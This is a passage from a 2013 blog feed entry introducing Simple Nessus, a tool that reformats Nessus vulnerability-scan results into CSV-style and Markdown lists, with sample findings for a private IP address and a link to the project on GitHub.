192.168.229.2;Apache Banner Linux Distribution Disclosure
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;While the Markdown code, triggered by &lt;code&gt;-o M&lt;/code&gt;, looks like:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;### 192.168.229.2
* Apache HTTP Server Byte Range DoS
* Apache Banner Linux Distribution Disclosure
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally, the &lt;code&gt;-ports&lt;/code&gt; option will show the specific ports for each vulnerability found by the scanner.&lt;/p&gt;

&lt;p&gt;--&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Get Simple Nessus on &lt;a href=&quot;http://gcattani.github.com/simple-nessus&quot;&gt;GitHub&lt;/a&gt;!&lt;/strong&gt;&lt;br&gt;
Have any suggestions to improve Simple Nessus? Contact me!&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/02/simple-nessus&quot;&gt;Introducing Simple Nessus&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on February 07, 2013.&lt;/p&gt;</content>
</entry>

</feed>
